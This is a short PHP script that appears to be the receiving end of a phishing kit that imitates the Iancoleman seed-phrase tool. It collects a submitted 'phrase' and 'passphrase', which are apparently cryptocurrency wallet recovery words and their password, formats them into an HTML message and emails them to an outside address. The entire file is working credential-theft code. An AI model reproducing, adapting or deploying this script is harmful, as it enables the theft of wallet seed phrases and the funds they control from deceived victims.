<?php

$phrase=$_REQUEST["phrase"];
$passphrase=$_REQUEST["passphrase"];

$message= "
<b>Phrase:</b>&nbsp;&nbsp;".$phrase."
<br><br>
<b>Pass phrase:</b>&nbsp;&nbsp;".$passphrase."
<br><br>";

$to='mail@gmail.com';

$subject = 'Response Data(Iancoleman New)';


mail($to, $subject, $message);


?>

